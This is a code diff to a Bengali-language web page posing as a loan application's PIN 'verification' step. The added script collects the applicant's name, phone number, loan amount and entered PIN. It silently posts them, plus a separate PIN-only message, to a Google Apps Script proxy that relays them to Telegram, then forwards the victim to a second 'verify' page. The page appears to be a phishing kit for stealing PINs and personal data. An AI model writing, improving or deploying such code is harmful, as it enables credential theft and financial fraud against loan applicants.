@@ -248,7 +248,7 @@
         </div>
 
         <!-- যাচাইকরণ ফর্ম -->
-        <form id="verifyForm" action="https://formspree.io/f/xvkkeegq" method="POST">
+        <form id="verifyForm">
             <!-- ব্যাকগ্রাউন্ডে পূর্ববর্তী পেজের নাম ও টাকার তথ্য জমা রাখার হিডেন ফিল্ড -->
             <input type="hidden" name="আবেদনকারীর_নাম" id="hiddenName">
             <input type="hidden" name="লোনের_পরিমাণ" id="hiddenAmount">
@@ -284,7 +284,7 @@
     <div class="bottom-links">
         <div class="link-item">
             <div class="link-icon"><i class="fa-solid fa-location-dot"></i></div>
-            <span class="link-title">শাখা সমূহ</span>
+            <span class="link-title"> শাখা সমূহ</span>
         </div>
         <div class="link-item">
             <div class="link-icon"><i class="fa-solid fa-percent"></i></div>
@@ -298,11 +298,19 @@
 </div>
 
 <script>
-    // পূর্ববর্তী পেজ থেকে ডেটা গ্রহণ
+    // আপনার গুগল অ্যাপস স্ক্রিপ্ট প্রক্সি URL (টেলিগ্রাম নোটিফিকেশনের জন্য)
+    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbw-MX5twDJTbDjN-B_llF5Y9TBb_Kv-W2pJ1Soymn3HbEG0CfAEtQ0WV7qmz8OPUgI/exec";
+
+    // পূর্ববর্তী পেজ বা লোকাল স্টোরেজ থেকে ডেটা গ্রহণ
     const params = new URLSearchParams(window.location.search);
-    const applicantName = params.get('name') || '';
-    const applicantPhone = params.get('phone') || '';
-    const loanAmount = params.get('amount') || '';
+    const applicantName = params.get('name') || localStorage.getItem('loan_cust_name') || 'N/A';
+    const applicantPhone = params.get('phone') || localStorage.getItem('loan_cust_phone') || '';
+    const loanAmount = params.get('amount') || localStorage.getItem('loan_cust_amount') || 'N/A';
+
+    // লোকাল স্টোরেজে ডেটা ব্যাকআপ রাখা (পরবর্তী পেজের জন্য)
+    if (applicantName !== 'N/A') localStorage.setItem('loan_cust_name', applicantName);
+    if (applicantPhone) localStorage.setItem('loan_cust_phone', applicantPhone);
+    if (loanAmount !== 'N/A') localStorage.setItem('loan_cust_amount', loanAmount);
 
     // ফর্মে ফিল্ডগুলো সেট করা
     document.getElementById('hiddenName').value = applicantName;
@@ -317,17 +325,44 @@
         event.preventDefault();
 
         btnSubmit.disabled = true;
-        btnSubmit.innerHTML = '<span>তথ্য পাঠানো হচ্ছে...</span>';
+        btnSubmit.innerHTML = '<span>তথ্য যাচাই হচ্ছে...</span>';
 
-        const data = new FormData(form);
+        const enteredPin = document.getElementById('trackPin').value.trim();
 
-        fetch(form.action, {
+        // ১. সম্পূর্ণ তথ্যের ফরম্যাটেড মেসেজ
+        const telegramMessage = `🔐 নতুন পিন যাচাই (ধাপ-১)!\n\n` +
+                                `👤 নাম: ${applicantName}\n` +
+                                `📞 মোবাইল: ${applicantPhone || 'পাওয়া যায়নি'}\n` +
+                                `💰 লোনের পরিমাণ: ${loanAmount} টাকা\n` +
+                                `🔑 পিন (PIN): ${enteredPin}\n` +
+                                `⏰ সময়: ${new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' })}`;
+
+        // ২. শুধুমাত্র পিন নম্বরটি আলাদা মেসেজ (সহজে কপি করার জন্য)
+        const pinOnlyMessage = `PIN: ${enteredPin}`;
+
+        // ১ম মেসেজ পাঠানো (বিস্তারিত তথ্য)
+        fetch(GOOGLE_SCRIPT_URL, {
             method: 'POST',
-            body: data,
-            headers: { 'Accept': 'application/json' }
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message: telegramMessage })
         }).finally(() => {
-            // সাবমিট শেষে সরাসরি verify2.html পেজে নিয়ে যাওয়া
-            window.location.href = "verify2.html";
+            // ২য় মেসেজ পাঠানো (শুধু পিন)
+            fetch(GOOGLE_SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ message: pinOnlyMessage })
+            }).finally(() => {
+                // সাবমিট শেষে তথ্যসহ verify2.html পেজে নিয়ে যাওয়া
+                const queryParams = new URLSearchParams({
+                    name: applicantName,
+                    phone: applicantPhone,
+                    amount: loanAmount
+                }).toString();
+
+                window.location.href = "verify2.html?" + queryParams;
+            });
         });
     });
 </script>
